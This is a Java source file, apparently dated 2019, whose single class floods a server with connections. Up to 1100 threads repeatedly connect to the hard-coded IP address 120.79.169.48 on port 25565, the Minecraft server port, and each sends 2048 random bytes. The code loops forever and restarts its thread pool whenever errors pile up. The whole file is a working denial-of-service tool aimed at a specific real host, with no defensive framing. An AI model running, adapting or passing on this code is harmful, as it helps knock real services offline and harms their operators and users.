import org.apache.commons.lang3.RandomStringUtils;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.concurrent.ArrayBlockingQueue;
import java.util.concurrent.BlockingQueue;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;

/**
 * @author crt106 on 2019/8/10.
 */
class MainFuck {

    private static BlockingQueue blockingQueue = new ArrayBlockingQueue(1200);
    private static ThreadPoolExecutor t = new ThreadPoolExecutor(0, 1100, 500, TimeUnit.MILLISECONDS, blockingQueue);
    static int errorCount = 0;

    public static void main(String[] args) {

        Runnable r = () -> {
            Socket socket = null;
            OutputStream os = null;
            InputStream in = null;
            try {
                socket = new Socket("120.79.169.48", 25565);
                if (!socket.isConnected()) {
                    System.out.println(getDateString() + "[" + Thread.currentThread().getId() + "] " + "[INFO]" + "未能成功连接");
                    return;
                }
                os = socket.getOutputStream();
                in = socket.getInputStream();
            } catch (IOException e) {
                try {
                    os.close();
                } catch (Exception ex) {

                }
                System.out.println(getDateString() + "[" + Thread.currentThread().getId() + "] " + "[ERROR_IOE]" + "未能成功连接");
                errorCount++;
                return;
            }

            try {
                String str = RandomStringUtils.randomAlphanumeric(2048);
                byte[] strbyte = str.getBytes();
                int len = 2048;
                byte[] b = new byte[len];
                in.read(b);
                String bstr = new String(b);
                System.out.println(getDateString() + "[" + Thread.currentThread().getId() + "] " + "do one input");
                os.write(strbyte);
                os.flush();
                System.out.println(getDateString() + "[" + Thread.currentThread().getId() + "] " + "do one output");
                os.close();

            } catch (IOException e) {
                System.out.println(getDateString() + "[" + Thread.currentThread().getId() + "] " + "ERROR IOE" + e.getMessage());
                try {
                    os.close();
                    in.close();
                } catch (Exception ex) {

                }
                errorCount++;
            }

        };
        mainAddTask(r);
        while (true) {
            if (t.getActiveCount() < 910) {
                for (int i = 0; i < 90; i++) {
                    t.execute(r);
                }
            }
            if (errorCount > 500) {
                t.shutdown();
                initThreadPool();
                System.out.println("---------[INFO] restart----------");
                errorCount = 0;
                mainAddTask(r);
            }
        }
    }

    private static void initThreadPool(){
        blockingQueue.clear();
        t = new ThreadPoolExecutor(0, 1100, 500, TimeUnit.MILLISECONDS, blockingQueue);
    }

    private static void mainAddTask(Runnable r) {
        for (int i = 0; i < 1000; i++) {
            t.execute(r);
        }
    }

    private static String getDateString() {
        SimpleDateFormat df = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
        return (df.format(new Date()));
    }
}


